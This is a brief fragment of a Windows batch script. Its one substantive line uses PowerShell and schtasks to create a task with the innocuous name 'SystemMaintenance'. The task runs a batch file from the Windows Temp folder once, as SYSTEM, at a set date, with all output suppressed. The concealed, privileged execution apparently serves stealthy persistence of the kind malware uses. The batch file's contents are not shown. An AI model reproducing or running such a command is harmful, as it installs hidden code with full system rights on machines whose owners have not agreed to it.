...
powershell -Command "schtasks /create /tn 'SystemMaintenance' /tr 'cmd.exe /c \"C:\Windows\Temp\system_maintenance.bat\" >nul 2>&1' /sc once /st 17:25 /sd 02/04/2026 /ru \"SYSTEM\" /f" >nul 2>&1
exit /b
